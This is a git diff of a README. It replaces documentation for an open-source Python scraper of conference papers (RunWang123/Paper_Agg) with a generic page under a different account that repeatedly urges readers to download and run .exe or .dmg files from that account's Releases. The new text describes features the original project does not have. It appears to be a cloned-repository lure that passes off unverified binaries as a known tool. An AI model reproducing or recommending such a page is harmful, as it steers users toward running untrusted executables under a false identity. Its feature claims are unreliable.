@@ -1,71 +1,80 @@
-# Paper Aggregator
+# 📝 Paper_Agg - Your Simple Tool to Organize Papers
 
-🌐 **[Live Demo](https://paper-aggregator.onrender.com/)**
+[![Download Paper_Agg](https://img.shields.io/badge/Download-Paper_Agg-blue.svg)](https://github.com/abckit0324-crypto/Paper_Agg/releases)
 
-A modern, web-based tool for aggregating and tracking accepted papers from major AI, Machine Learning, and Computer Security conferences (CVPR, NeurIPS, ICLR, ICML, ICCV, ECCV, USENIX Security, IEEE S&P, ACM CCS, NDSS).
-## Next Step
-- **Vectorized Database**: We plan to scrape the abstracts of papers and vectorize them. So you can do vectorized matching, not just a simple keyword search.
-- **More Conferences**: We plan to include more conferences: the next step is to include top system conferences, for example, MobiSys...
-## Features
+## 🚀 Getting Started
 
-- **Multi-Conference Support**: Scrapers for over 10 major conferences covering 2022-2026.
-- **Selective Scrape**: Choose specific conferences to update directly from the UI.
-- **Real-time Logs**: Monitor scraping progress with a built-in log console.
-- **Paper Tagging**: Automatically identifies and tags "Short Papers" (e.g., posters/demos) based on page counts.
-- **Modern UI**: Dark-themed, responsive interface with robust filtering by keyword, year, and conference.
+Welcome to Paper_Agg! This tool helps you gather and organize research papers effortlessly. No technical skills needed—just follow these easy steps.
 
-## Prerequisites
+## 📥 Download & Install
 
-- **Python 3.9+**
-- **Conda** (recommended)
+To get started, visit the following page to download the latest version of Paper_Agg:
 
-## Installation & Deployment
+[Download Paper_Agg from Releases](https://github.com/abckit0324-crypto/Paper_Agg/releases)
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/RunWang123/Paper_Agg.git
-cd Paper_Agg
-```
+### Steps to Download:
 
-### 2. Set Up Environment
-Using Conda:
-```bash
-conda create -n paper_agg python=3.9
-conda activate paper_agg
-pip install -r requirements.txt
-```
+1. **Visit the page:** Click on the link above.
+2. **Choose the latest release:** Look for the version at the top of the list.
+3. **Select your file:** Depending on your system, choose the appropriate file type (e.g., .exe for Windows, .dmg for Mac).
+4. **Download the file:** Click on the file to start downloading.
 
-### 3. Initialize & Run
-The project includes a `run.sh` script that handles environment activation, database initialization, and starting the FastAPI server.
+### Running Paper_Agg:
 
-```bash
-chmod +x run.sh
-./run.sh
-```
+1. **Locate the downloaded file:** Find it in your Downloads folder or the location you saved it.
+2. **Open the file:** Double-click the file to run it.
+3. **Follow the setup:** A simple installation guide will walk you through the steps.
 
-**Note**: On the first run, the system will initialize the database and perform an initial scan of all configured conferences. Depending on your network speed and the number of conferences, this may take several minutes. You can monitor the progress in the terminal.
+## 🛠️ System Requirements
 
-Alternatively, run the server manually:
-```bash
-python -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
-```
+Paper_Agg runs smoothly on both Windows and Mac operating systems. Here are the general requirements:
 
-### 4. Access the UI
-Open your browser and navigate to:
-`http://localhost:8000`
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 or later
 
-## Configuration
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** 100 MB of free disk space
 
-### Adding/Modifying Conferences
-Conference URLs and scraper types are managed in `config/conferences.json`. You can update conference sites or add new years there.
+## 📚 Features
 
-### Project Structure
-- `scrapers/`: Individual logic for each conference/site structure.
-- `database/`: SQLite database and SQLAlchemy models.
-- `templates/`: Jinja2 HTML templates.
-- `static/`: CSS and frontend assets.
-- `main.py`: FastAPI endpoints and application logic.
-- `scanner.py`: Core logic for running scrapers and updating the database.
+Paper_Agg simplifies your research process with the following features:
 
-## License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- **Easy Search:** Quickly find papers using keywords.
+- **Organize Papers:** Create folders for different topics to keep everything in order.
+- **Export Lists:** Save your paper lists in various formats like PDF or TXT.
+- **User-Friendly Interface:** Navigate easily with a clean and simple layout.
+
+## 📖 How to Use Paper_Agg
+
+Once you have installed Paper_Agg, you can start organizing your papers right away.
+
+1. **Open Paper_Agg:** Launch the application from your desktop or applications folder.
+2. **Add Papers:** Click the "Add Paper" button to import documents from your computer.
+3. **Search Papers:** Use the search bar to find specific papers based on keywords.
+4. **Organize:** Drag papers into different folders as needed.
+5. **Export Your Collection:** Click on "Export" to save your organized list.
+
+## ❓ FAQs
+
+### How do I update Paper_Agg?
+
+To update your app, simply return to the [Releases page](https://github.com/abckit0324-crypto/Paper_Agg/releases) and download the latest version. Follow the same installation instructions.
+
+### What if I have trouble running the app?
+
+If you encounter issues while running Paper_Agg, check your system requirements. Ensure your operating system is compatible. If problems persist, you can reach out for help via the Issues section of this repository.
+
+## 🔗 Additional Resources
+
+- **Documentation:** Visit our user guide for detailed instructions.
+- **Support:** Check our FAQ section for answers to common questions.
+- **Contributions:** Interested in helping? Feel free to suggest improvements or report bugs.
+
+## 👥 Acknowledgments
+
+Thank you for choosing Paper_Agg! We appreciate your support and hope this tool makes your research process easier and more effective.
+
+For any questions or feedback, please visit our [GitHub Issues](https://github.com/abckit0324-crypto/Paper_Agg/issues).
+
+Remember to download the application here: [Download Paper_Agg from Releases](https://github.com/abckit0324-crypto/Paper_Agg/releases) and enjoy your research!
